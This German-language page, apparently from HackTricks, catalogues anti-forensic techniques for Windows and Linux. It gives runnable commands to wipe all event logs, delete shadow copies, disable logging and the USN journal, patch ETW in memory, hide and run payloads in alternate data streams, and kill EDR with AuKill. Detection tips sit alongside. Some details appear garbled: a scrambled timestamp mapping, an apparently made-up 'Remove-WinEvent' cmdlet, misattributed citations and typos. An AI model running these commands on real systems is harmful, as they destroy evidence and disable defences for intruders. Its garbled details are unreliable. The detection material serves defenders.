# Anti-Forensic Techniques

## Zeitstempel

Ein Angreifer könnte daran interessiert sein, **die Zeitstempel von Dateien zu ändern**, um einer Entdeckung zu entgehen.\
Die Zeitstempel können innerhalb der MFT in den Attributen `$STANDARD_INFORMATION` \_\_ und \_\_ `$FILE_NAME` gefunden werden.

Beide Attribute enthalten 4 Zeitstempel: **Änderung**, **Zugriff**, **Erstellung** und **Änderung der MFT-Registrierung** (MACE oder MACB).

**Windows explorer** und andere Tools zeigen die Informationen aus **`$STANDARD_INFORMATION`** an.

### TimeStomp - Anti-forensic Tool

Dieses Tool **ändert** die Zeitstempelinformationen innerhalb von **`$STANDARD_INFORMATION`**, jedoch **nicht** die Informationen innerhalb von **`$FILE_NAME`**. Daher ist es möglich, **verdächtige** **Aktivitäten** zu **identifizieren**.

### Usnjrnl

Das **USN Journal** (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT file system), die Änderungen am Volume protokolliert. Das Tool [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) ermöglicht die Untersuchung dieser Änderungen.

![TimeStomp - Anti-forensic Tool - Usnjrnl: Das USN Journal (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT file system), die Änderungen am Volume protokolliert. Das...](<../../images/image (801).png>)

Das vorherige Bild zeigt die vom **Tool** angezeigte **Ausgabe**, in der erkennbar ist, dass einige **Änderungen an der Datei vorgenommen wurden**.

### $LogFile

**Alle Metadatenänderungen an einem Dateisystem werden** in einem als [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) bekannten Prozess protokolliert. Die protokollierten Metadaten werden in einer Datei namens `**$LogFile**` gespeichert, die sich im Stammverzeichnis eines NTFS-Dateisystems befindet. Tools wie [LogFileParser](https://github.com/jschicht/LogFileParser) können verwendet werden, um diese Datei zu analysieren und Änderungen zu identifizieren.

![Usnjrnl - $LogFile: Alle Metadatenänderungen an einem Dateisystem werden in einem als write-ahead logging bekannten Prozess protokolliert. Die protokollierten Metadaten werden in einer Datei namens $LogFile gespeichert, die sich im Stammverzeichnis...](<../../images/image (137).png>)

Auch in der Ausgabe des Tools ist es möglich zu sehen, dass **einige Änderungen vorgenommen wurden**.

Mit demselben Tool ist es möglich zu identifizieren, **auf welche Zeit die Zeitstempel geändert wurden**:

![Usnjrnl - $LogFile: Mit demselben Tool ist es möglich zu identifizieren, auf welche Zeit die Zeitstempel geändert wurden](<../../images/image (1089).png>)

- CTIME: Erstellungszeit der Datei
- ATIME: Änderungszeit der Datei
- MTIME: Änderung der MFT-Registrierung der Datei
- RTIME: Zugriffszeit der Datei

### Vergleich von `$STANDARD_INFORMATION` und `$FILE_NAME`

Eine weitere Möglichkeit, verdächtig geänderte Dateien zu identifizieren, besteht darin, die Zeitangaben beider Attribute zu vergleichen und nach **Abweichungen** zu suchen.

### Nanosekunden

**NTFS**-Zeitstempel haben eine **Genauigkeit** von **100 Nanosekunden**. Daher ist es sehr verdächtig, Dateien mit Zeitstempeln wie 2010-10-10 10:10:**00.000:0000 zu finden**.

### SetMace - Anti-forensic Tool

Dieses Tool kann beide Attribute `$STARNDAR_INFORMATION` und `$FILE_NAME` ändern. Ab Windows Vista ist jedoch ein laufendes OS erforderlich, um diese Informationen zu ändern.

## Datenverbergung

NFTS verwendet Cluster und eine minimale Informationsgröße. Das bedeutet, dass, wenn eine Datei einen Cluster und einen halben Cluster belegt, die **übrige Hälfte niemals verwendet wird**, bis die Datei gelöscht wird. Daher ist es möglich, **Daten in diesem slack space zu verbergen**.

Es gibt Tools wie slacker, die das Verbergen von Daten in diesem „verborgenen“ Bereich ermöglichen. Eine Analyse von `$logfile` und `$usnjrnl` kann jedoch zeigen, dass Daten hinzugefügt wurden:

![SetMace - Anti-forensic Tool - Datenverbergung: Es gibt Tools wie slacker, die das Verbergen von Daten in diesem „verborgenen“ Bereich ermöglichen. Eine Analyse von $logfile und $usnjrnl kann jedoch zeigen, dass...](<../../images/image (1060).png>)

Anschließend ist es möglich, den slack space mit Tools wie FTK Imager abzurufen. Beachte, dass diese Art von Tool den Inhalt obfuskiert oder sogar verschlüsselt speichern kann.

## UsbKill

Dieses Tool **schaltet den Computer aus, sobald eine Änderung an den USB-Ports** erkannt wird.\
Eine Möglichkeit, dies zu entdecken, besteht darin, die laufenden Prozesse zu untersuchen und **jedes ausgeführte Python-Skript zu überprüfen**.

## Live-Linux-Distributionen

Diese Distros werden **im RAM** ausgeführt. Die einzige Möglichkeit, sie zu erkennen, besteht darin, dass das NTFS-Dateisystem **mit Schreibberechtigungen eingebunden** ist. Wenn es nur mit Leseberechtigungen eingebunden ist, kann der Intrusion nicht erkannt werden.

## Sichere Löschung

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows-Konfiguration

Es ist möglich, mehrere Windows-Logging-Methoden zu deaktivieren, um die forensische Untersuchung erheblich zu erschweren.

### Zeitstempel deaktivieren - UserAssist

Dies ist ein Registry-Schlüssel, der Datum und Uhrzeit speichert, zu denen jede ausführbare Datei vom Benutzer ausgeführt wurde.

Das Deaktivieren von UserAssist erfordert zwei Schritte:

1. Setze zwei Registry-Schlüssel, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` und `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, beide auf null, um zu signalisieren, dass UserAssist deaktiviert werden soll.
2. Lösche deine Registry-Teilstrukturen, die wie `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` aussehen.

### Zeitstempel deaktivieren - Prefetch

Dabei werden Informationen über die ausgeführten Anwendungen gespeichert, um die Leistung des Windows-Systems zu verbessern. Diese Informationen können jedoch auch für forensische Untersuchungen nützlich sein.

- Führe `regedit` aus
- Wähle den Dateipfad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Klicke mit der rechten Maustaste auf `EnablePrefetcher` und `EnableSuperfetch`
- Wähle bei beiden Einträgen „Modify“, um den Wert von 1 (oder 3) auf 0 zu ändern
- Neustart

### Zeitstempel deaktivieren - Zeitpunkt des letzten Zugriffs

Wann immer ein Ordner von einem NTFS-Volume auf einem Windows NT-Server geöffnet wird, aktualisiert das System ein Zeitstempelfeld für jeden aufgelisteten Ordner, das als Zeitpunkt des letzten Zugriffs bezeichnet wird. Auf einem stark genutzten NTFS-Volume kann dies die Leistung beeinträchtigen.

1. Öffne den Registry Editor (Regedit.exe).
2. Navigiere zu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Suche nach `NtfsDisableLastAccessUpdate`. Falls der Eintrag nicht existiert, füge dieses DWORD hinzu und setze seinen Wert auf 1, wodurch der Prozess deaktiviert wird.
4. Schließe den Registry Editor und starte den Server neu.

### USB-Verlauf löschen

Alle **USB Device Entries** werden in der Windows Registry unter dem **USBSTOR**-Registry-Schlüssel gespeichert. Dieser enthält Unterschlüssel, die jedes Mal erstellt werden, wenn du ein USB Device an deinen PC oder Laptop anschließt. Du findest diesen Schlüssel hier: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Durch das Löschen dieses Schlüssels** wird der USB-Verlauf gelöscht.\
Du kannst auch das Tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) verwenden, um sicherzustellen, dass du sie gelöscht hast (und um sie zu löschen).

Eine weitere Datei, die Informationen über die USBs speichert, ist die Datei `setupapi.dev.log` in `C:\Windows\INF`. Auch diese sollte gelöscht werden.

### Shadow Copies deaktivieren

**Liste** die Shadow Copies mit `vssadmin list shadowstorage` auf.\
**Lösche** sie mit `vssadmin delete shadow`.

Du kannst sie auch über die GUI löschen, indem du die unter [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) vorgeschlagenen Schritte befolgst.

Um Shadow Copies zu deaktivieren, befolge [diese Schritte](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Öffne das Programm „Services“, indem du nach dem Klicken auf die Windows-Startschaltfläche „services“ in das Textsuchfeld eingibst.
2. Suche in der Liste nach „Volume Shadow Copy“, wähle es aus und öffne die Eigenschaften durch einen Rechtsklick.
3. Wähle im Dropdown-Menü „Startup type“ die Option „Disabled“ und bestätige die Änderung mit „Apply“ und „OK“.

Es ist auch möglich, in der Registry unter `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` zu ändern, welche Dateien in der Shadow Copy kopiert werden.

### Gelöschte Dateien überschreiben

- Du kannst ein **Windows tool** verwenden: `cipher /w:C`. Dadurch wird cipher angewiesen, alle Daten aus dem verfügbaren ungenutzten Speicherplatz auf dem Laufwerk C zu entfernen.
- Du kannst auch Tools wie [**Eraser**](https://eraser.heidi.ie) verwenden.

### Windows event logs löschen

- Windows + R --> eventvwr.msc --> Erweitere „Windows Logs“ --> Klicke mit der rechten Maustaste auf jede Kategorie und wähle „Clear Log“
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows event logs deaktivieren

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktiviere im Services-Bereich den Service „Windows Event Log“
- `WEvtUtil.exec clear-log` oder `WEvtUtil.exe cl`

### $UsnJrnl deaktivieren

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Aktuelle Versionen von Windows 10/11 und Windows Server speichern **umfangreiche forensische PowerShell-Artefakte** unter
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Angreifer können sie on-the-fly deaktivieren oder löschen:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Verteidiger sollten Änderungen an diesen Registrierungsschlüsseln und das Entfernen von PowerShell-Events in hoher Anzahl überwachen.

### ETW (Event Tracing for Windows) Patch

Endpoint-Security-Produkte sind stark auf ETW angewiesen. Eine beliebte Umgehungsmethode aus dem Jahr 2024 besteht darin, `ntdll!EtwEventWrite`/`EtwEventWriteFull` im Speicher zu patchen, sodass jeder ETW-Aufruf `STATUS_SUCCESS` zurückgibt, ohne das Event auszugeben:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Öffentliche PoCs (z. B. `EtwTiSwallow`) implementieren dasselbe Primitive in PowerShell oder C++.
Da der Patch **process-local** ist, übersehen EDRs, die innerhalb anderer Prozesse ausgeführt werden, ihn möglicherweise.<sup>[[5]](#references)</sup>
Erkennung: `ntdll` im Speicher mit der Version auf dem Datenträger vergleichen oder vor dem User-Mode hooken.

### Wiederaufleben von Alternate Data Streams (ADS)

Bei Malware-Kampagnen im Jahr 2023 (z. B. **FIN12**-Loader) wurde beobachtet, dass Second-Stage-Binaries
innerhalb von ADS abgelegt werden, um außerhalb der Sichtweite herkömmlicher Scanner zu bleiben:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumeriere Streams mit `dir /R`, `Get-Item -Stream *` oder Sysinternals `streams64.exe`.
Das Kopieren der Host-Datei auf FAT/exFAT oder über SMB entfernt den versteckten Stream und kann
von Ermittlern zur Wiederherstellung der Payload verwendet werden.

### BYOVD & „AuKill“ (2023)

Bring-Your-Own-Vulnerable-Driver wird inzwischen routinemäßig für **anti-forensics** bei Ransomware-
Intrusionen eingesetzt.
Das Open-Source-Tool **AuKill** lädt einen signierten, aber verwundbaren Treiber (`procexp152.sys`), um
EDR- und forensische Sensoren **vor der Verschlüsselung und Protokollzerstörung** zu
suspendieren oder zu beenden:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Der Treiber wird anschließend entfernt, sodass nur minimale Artefakte zurückbleiben.<sup>[[1]](#references)</sup>
Maßnahmen: die Microsoft vulnerable-driver blocklist (HVCI/SAC) aktivieren
und bei der Erstellung von Kernel-Services aus benutzerschreibbaren Pfaden alarmieren.

---

## Linux Anti-Forensics: Self-Patching und Cloud C2 (2023–2025)

### Self-Patching kompromittierter Services zur Reduzierung der Erkennung (Linux)
Angreifer führen zunehmend direkt nach der Ausnutzung eines Services ein „Self-Patching“ durch, um sowohl eine erneute Ausnutzung zu verhindern als auch auf Schwachstellen basierende Erkennungen zu unterdrücken. Dabei werden verwundbare Komponenten durch die neuesten legitimen Upstream-Binaries/JARs ersetzt, sodass Scanner den Host als gepatcht melden, während Persistence und C2 bestehen bleiben.<sup>[[3]](#references)</sup>

Beispiel: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nach der Post-Exploitation luden Angreifer legitime JARs von Maven Central (repo1.maven.org) herunter, löschten verwundbare JARs in der ActiveMQ-Installation und starteten den Broker neu.
- Dadurch wurde die ursprüngliche RCE geschlossen, während andere Footholds (cron, SSH-Konfigurationsänderungen, separate C2-Implants) erhalten blieben.

Operatives Beispiel (zur Veranschaulichung)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensik-/Hunting-Tipps
- Überprüfe Service-Verzeichnisse auf nicht geplante Ersetzungen von Binärdateien/JARs:
- Debian/Ubuntu: `dpkg -V activemq` und vergleiche Dateihashes/-pfade mit Repository-Mirrors.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Suche nach JAR-Versionen auf dem Datenträger, die nicht dem Package Manager gehören, oder nach außerhalb des regulären Prozesses aktualisierten symbolischen Links.
- Zeitachse: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`, um ctime/mtime mit dem Zeitraum des Compromise zu korrelieren.
- Shell-History/Prozess-Telemetrie: Hinweise auf `curl`/`wget` zu `repo1.maven.org` oder anderen Artifact-CDNs unmittelbar nach der initialen Exploitation.
- Change Management: Validiere, wer den „Patch“ angewendet hat und warum, nicht nur, dass eine gepatchte Version vorhanden ist.

### Cloud-Service-C2 mit Bearer-Tokens und Anti-Analysis-Stagern
Die beobachtete Vorgehensweise kombinierte mehrere lang laufende C2-Pfade und Anti-Analysis-Pakete:<sup>[[3]](#references)</sup>
- Passwortgeschützte PyInstaller-ELF-Loader, um Sandboxing und statische Analyse zu erschweren (z. B. verschlüsseltes PYZ, temporäre Extraktion unter `/_MEI*`).
- Indikatoren: `strings`-Treffer wie `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Laufzeit-Artefakte: Extraktion nach `/tmp/_MEI*` oder in benutzerdefinierte `--runtime-tmpdir`-Pfade.
- Dropbox-gestützte C2 mit fest einprogrammierten OAuth-Bearer-Tokens
- Netzwerkmarker: `api.dropboxapi.com` / `content.dropboxapi.com` mit `Authorization: Bearer <token>`.
- Suche in Proxy/NetFlow/Zeek/Suricata nach ausgehendem HTTPS zu Dropbox-Domains von Server-Workloads, die normalerweise keine Dateien synchronisieren.
- Parallele/Backup-C2 über Tunneling (z. B. Cloudflare Tunnel `cloudflared`), um die Kontrolle aufrechtzuerhalten, wenn ein Kanal blockiert ist.
- Host-IOCs: `cloudflared`-Prozesse/-Units, Konfiguration unter `~/.cloudflared/*.json`, ausgehend 443 zu Cloudflare-Edges.

### Persistenz und „Hardening-Rollback“ zur Aufrechterhaltung des Zugriffs (Linux-Beispiele)
Angreifer kombinieren Self-Patching häufig mit dauerhaften Zugriffspfaden:<sup>[[3]](#references)</sup>
- Cron/Anacron: Änderungen am `0anacron`-Stub in jedem `/etc/cron.*/`-Verzeichnis zur regelmäßigen Ausführung.
- Suche:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- Rollback des SSH-Konfigurations-Hardenings: Aktivierung von Root-Logins und Änderung der Standard-Shells für Accounts mit niedrigen Berechtigungen.
- Suche nach Aktivierung von Root-Logins:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# Werte wie "yes" oder übermäßig freizügige Einstellungen markieren
```
- Suche nach verdächtigen interaktiven Shells bei System-Accounts (z. B. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Zufällige Beacon-Artefakte mit kurzen Namen (8 alphabetische Zeichen), die auf dem Datenträger abgelegt werden und außerdem eine Cloud-C2 kontaktieren:
- Suche:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Verteidiger sollten diese Artefakte mit externer Angriffsfläche und Ereignissen des Service-Patchings korrelieren, um die zur Verschleierung der initialen Exploitation eingesetzte anti-forensische Selbstbereinigung aufzudecken.

## References

- [1] [Sophos X-Ops – AuKill: Ein weaponisierter verwundbarer Treiber zur Deaktivierung von EDR (März 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching von EtwEventWrite für Stealth: Erkennung und Hunting (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching für Persistenz: Wie sich die Linux-Malware DripDropper durch die Cloud bewegt](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
